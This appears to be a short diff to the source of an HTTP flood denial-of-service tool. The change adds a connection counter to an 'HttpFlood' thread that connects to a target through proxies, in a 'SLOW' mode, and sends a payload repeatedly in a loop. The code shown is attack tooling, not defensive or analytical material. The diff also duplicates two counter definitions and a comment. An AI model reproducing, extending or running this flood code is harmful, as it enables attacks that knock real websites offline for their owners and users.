@@ -242,7 +242,10 @@ class Counter:
 
 REQUESTS_SENT = Counter()
 BYTES_SEND = Counter()
+REQUESTS_SENT = Counter()
+BYTES_SEND = Counter()
 TOTAL_REQUESTS_SENT = Counter()
+CONNECTIONS_SENT = Counter()
 
 
 class Tools:
@@ -1550,10 +1553,11 @@ class HttpFlood(Thread):
             s = self.open_connection()
             # Increment Global Counter for visual feedback
             # Increment Global Counter for visual feedback
-            global REQUESTS_SENT, TOTAL_REQUESTS_SENT
+            global REQUESTS_SENT, TOTAL_REQUESTS_SENT, CONNECTIONS_SENT
             REQUESTS_SENT += 1
             TOTAL_REQUESTS_SENT += 1
-            print(f"[{int(TOTAL_REQUESTS_SENT)}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
+            CONNECTIONS_SENT += 1
+            print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
             for _ in range(self._rpc):
                 Tools.send(s, payload)
             
